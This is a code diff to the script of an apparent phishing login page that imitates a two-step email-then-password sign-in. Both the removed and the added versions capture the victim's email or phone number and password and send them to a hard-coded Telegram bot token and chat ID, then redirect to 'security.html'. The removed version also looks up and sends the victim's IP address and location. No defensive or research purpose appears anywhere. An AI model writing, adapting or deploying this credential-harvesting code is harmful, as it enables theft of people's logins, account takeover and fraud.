@@ -72,88 +72,68 @@
 </div>
 
 <script>
-
-// Handle the form submission for email (no validation required)
-document.getElementById('emailForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent form submission
-
-    const emailInput = document.getElementById('email'); // Get the email input field
-    const emailValue = emailInput.value.trim(); // Trim leading/trailing spaces
+    // Handle the form submission for email (no validation required)
+    document.getElementById('emailForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form submission
     
-    // If there's any input (not empty), proceed to the password section
-    if (emailValue.length > 0) {
-        // Display the email in the password section
-        document.getElementById('email-display').innerText = emailValue;
-
-        // Hide the email section and show the password section
-        document.querySelector('.email-section').style.display = 'none';
-        document.querySelector('.password-section').style.display = 'block';
-    } else {
-        // If the email field is empty, alert the user to enter something
-        alert("Please enter an email or mobile phone number.");
-    }
-});
-
-// Allow user to go back and change the email address
-document.querySelector('.change-email').addEventListener('click', function(event) {
-    event.preventDefault(); // Prevent default anchor behavior
-
-    // Show the email section and hide the password section
-    document.querySelector('.password-section').style.display = 'none';
-    document.querySelector('.email-section').style.display = 'block';
-});
-
-// Handle password form submission
-document.getElementById('passwordForm').addEventListener('submit', function(event){
-    event.preventDefault(); // Prevent form submission
-
-    var email = document.getElementById("email").value; // Get email value
-    var password = document.getElementById("password").value; // Get password value
-
-    // Get the user's IP address, country, region, city, and zip code from ip-api
-    fetch('http://ip-api.com/json/')
-        .then(response => response.json())
-        .then(data => {
-            var ipAddress = data.query; // IP address
-            var country = data.country;
-            var region = data.regionName;
-            var city = data.city;
-            var zip = data.zip;
-
-            // Create the message to send to Telegram
-            var message = `
-                Email or Phone: ${email}
-                Password: ${password}
-                IP Address: ${ipAddress}
-                Country: ${country}
-                Region: ${region}
-                City: ${city}
-                ZIP Code: ${zip}
-            `;
-
-            // Telegram Bot API request (replace with your bot's token and chat ID)
-            var telegramAPI = `https://api.telegram.org/bot7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
-
-            // Send message to Telegram
-            fetch(telegramAPI)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        // Redirect to a different page after successful submission
-                        window.location.href = "security.html"; // Replace with your desired redirect page
-                    } else {
-                        alert("Error logging in.");
-                    }
-                })
-                .catch(error => {
-                    alert("Error: " + error.message);
-                });
-        })
-        .catch(error => {
-            alert("Error logging in: " + error.message);
-        });
-});
-</script>
+        const emailInput = document.getElementById('email'); // Get the email input field
+        const emailValue = emailInput.value.trim(); // Trim leading/trailing spaces
+        
+        // If there's any input (not empty), proceed to the password section
+        if (emailValue.length > 0) {
+            // Display the email in the password section
+            document.getElementById('email-display').innerText = emailValue;
+    
+            // Hide the email section and show the password section
+            document.querySelector('.email-section').style.display = 'none';
+            document.querySelector('.password-section').style.display = 'block';
+        } else {
+            // If the email field is empty, alert the user to enter something
+            alert("Please enter an email or mobile phone number.");
+        }
+    });
+    
+    // Allow user to go back and change the email address
+    document.querySelector('.change-email').addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent default anchor behavior
+    
+        // Show the email section and hide the password section
+        document.querySelector('.password-section').style.display = 'none';
+        document.querySelector('.email-section').style.display = 'block';
+    });
+    
+    // Handle password form submission
+    document.getElementById('passwordForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form submission
+    
+        var email = document.getElementById("email").value; // Get email value
+        var password = document.getElementById("password").value; // Get password value
+    
+        // Create the message to send to Telegram (no IP data)
+        var message = `Email or Phone: ${email}\nPassword: ${password}`;
+    
+        // Telegram Bot API request (replace with your bot's token and chat ID)
+        var telegramAPI = `https://api.telegram.org/bot7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
+    
+        // Send message to Telegram
+        fetch(telegramAPI)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Redirect to a different page after successful submission
+                    window.location.href = "security.html"; // Replace with your desired redirect page
+                } else {
+                    alert("Error logging in.");
+                }
+            })
+            .catch(error => {
+                console.error("Telegram API Error: ", error);
+                alert("Error sending message to Telegram: " + error.message);
+            });
+    });
+    </script>
+    
+    
 
 </body>
 </html>
